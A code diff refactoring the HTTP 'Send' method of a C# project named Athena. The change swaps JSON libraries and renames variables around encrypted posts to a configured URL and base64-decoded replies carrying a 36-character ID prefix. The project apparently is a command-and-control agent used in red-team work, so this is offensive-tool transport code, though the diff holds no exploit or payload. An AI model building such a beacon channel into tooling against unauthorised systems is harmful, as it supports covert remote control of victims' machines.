@@ -1,6 +1,6 @@
 ﻿using Athena.Models.Config;
 using Athena.Utilities;
-using Newtonsoft.Json;
+using System.Text.Json;
 using System.Net;
 using System.Net.Security;
 
@@ -102,11 +102,10 @@ namespace Athena
             }
 
         }
-        public async Task<string> Send(object obj)
+        public async Task<string> Send(string json)
         {
             try
             {
-                string json = JsonConvert.SerializeObject(obj);
                 if (this.encrypted)
                 {
                     json = this.crypt.Encrypt(json);
@@ -127,16 +126,16 @@ namespace Athena
                     response = await this.client.PostAsync(this.postURL, new StringContent(json));
                 }
 
-                json = await response.Content.ReadAsStringAsync();
+                string strRes = await response.Content.ReadAsStringAsync();
 
                 if (this.encrypted)
                 {
-                    return this.crypt.Decrypt(json);
+                    return this.crypt.Decrypt(strRes);
                 }
 
-                if (!string.IsNullOrEmpty(json))
+                if (!string.IsNullOrEmpty(strRes))
                 {
-                    return (await Misc.Base64Decode(json)).Substring(36);
+                    return (await Misc.Base64Decode(strRes)).Substring(36);
                 }
 
                 return String.Empty;
